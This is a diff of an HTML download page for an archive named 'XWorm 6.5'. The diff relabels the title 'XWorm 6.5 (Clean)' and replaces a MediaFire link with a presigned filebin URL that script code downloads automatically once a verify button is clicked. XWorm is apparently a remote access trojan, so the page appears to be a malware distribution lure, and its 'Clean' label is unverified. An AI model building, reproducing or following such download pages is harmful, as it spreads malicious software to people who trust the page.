@@ -112,7 +112,7 @@
 <body>
 
 <div class="card">
-  <h1>XWorm 6.5</h1>
+  <h1>XWorm 6.5 (Clean)</h1>
   <p class="status" id="status">Status: <span>Waiting to download…</span></p>
   <button class="download-btn" id="downloadBtn">Download</button>
   <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
@@ -161,7 +161,7 @@ verifyBtn.addEventListener('click', () => {
       btn.disabled = false;
       // trigger actual download
       const a = document.createElement('a');
-      a.href = "https://download938.mediafire.com/y3oq95i7quagw0zohHc0W4eZVpJpOz0KMN90JNOJSnuFSkt1Mkqf6qZYE6DQo_9u5Syf8bYH1AUKwhm07vlqRG2cTZtsjff71vrSmvKbD8ugQLyj3qUE5OtqPLVEaDgD3l8UU66XXnkERLTnjIr8j2rgbZz_aOwP5HJVLGTtDL7xug/kwqnsv2ubc8r9xf/XWorm+V6.5.rar";
+      a.href = "https://s3.filebin.net/filebin/f50dbfb6ebdb430afce61cefbb798b8891e20cb0bfd7d6e6224599536d2a455c/b8887a75e2a73273ef2a041e8ab3cd685385cfc4224914b6b3e955d88b718258?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=7pMj6hGeoKewqmMQILjm%2F20251027%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20251027T160744Z&X-Amz-Expires=60&X-Amz-SignedHeaders=host&response-cache-control=max-age%3D60&response-content-disposition=inline%3B%20filename%3D%22XWorm%20V6.5.rar%22&response-content-type=application%2Fx-rar-compressed&X-Amz-Signature=536a061417b34a85d4a123c9f0236f9638fa59572526dc4ed9e0aaf448fb3e9f";
       a.download = 'XWorm_6.5.rar';
       document.body.appendChild(a);
       a.click();
